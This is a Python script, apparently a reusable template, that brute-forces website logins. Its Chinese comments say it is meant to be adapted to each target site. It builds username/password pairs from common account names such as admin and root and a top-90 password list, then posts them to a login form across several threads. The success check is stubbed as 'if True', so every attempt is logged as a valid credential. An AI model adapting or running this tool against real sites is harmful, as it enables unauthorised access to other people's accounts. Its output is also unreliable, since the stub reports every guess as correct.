from queue import Queue
import requests

from bruteforce import bruteforce, success_queue, dict_queue


def login():
    """
    登录和检测登录结果的代码针对每个网站分别完成
    login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
    :return:
    """
    try:
        login_info = dict_queue.get(block=False)
    except :
        return

    username = login_info[0]
    password = login_info[1]

    ################################实现登录过程开始
    payload = {
        "username": username,
        "password": password
    }
    r = requests.post("http://127.0.0.1/", data=payload)
    # r = requests.post("https://httpbin.org/post", data=payload)
    # 判断是否登录成功
    # print(r.text)
    ##################################实现登录过程结束

    ##################################检查密码是否正确开始
    if True:
        # if r.status_code == 302:  # 根据实际情况修改此处，判定登录成功
        msg = login_info
        # 登录成功则把登录信息保存到success_queue
        success_queue.put(msg)

    ################################## 检查密码是否正确结束


def get_dict():
    """
    生成字典队列
    :return:
    """
    with open("dict/top_90.txt") as f:
        passwords = f.readlines()

    passwords = [line.strip() for line in passwords]

    username = ['admin', 'root', 'user', 'a', 'b', 'c', 'd', 'e', 'f', 'a', 'fa', 'aw']

    count = 0
    for u in username:
        for p in passwords:
            count += 1
            pair = (u, p)
            dict_queue.put(pair)
    print("字典生成完成，长度 {}".format(count))


if __name__ == "__main__":
    get_dict()
    bruteforce(login, thread_num=3)
